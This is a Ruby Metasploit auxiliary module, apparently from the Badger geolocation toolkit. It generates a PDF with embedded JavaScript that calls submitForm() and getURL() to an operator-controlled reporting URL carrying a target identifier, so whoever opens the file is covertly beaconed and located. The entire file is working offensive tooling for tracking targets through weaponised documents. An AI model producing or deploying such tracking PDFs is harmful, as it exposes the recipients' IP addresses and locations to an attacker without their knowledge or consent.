require 'msf/core/exploit/pdf'
require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Auxiliary
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::PDF
	include Msf::Auxiliary::Badger_Report

	def initialize(info = {})
		super(update_info(info, 
			'Name'		=> 'PDF Geolocation (Badger)',
			'Description'	=> %q{
			This module can be used to create a PDF document that will attempt to
			connect to a http geolocation server through either AcroJS submitForm()
			or getURL() functions.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['v10l3nt']
		))
		register_options([OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),],
				self.class)
	end

	def run

		reporting_uri = "#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=msf_pdftrack"

		script = %Q|
		this.submitForm("#{reporting_uri}");
		app.doc.getURL('#{reporting_uri}');
		|

		pdf = CreatePDF(script)
		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(pdf)
	end

end
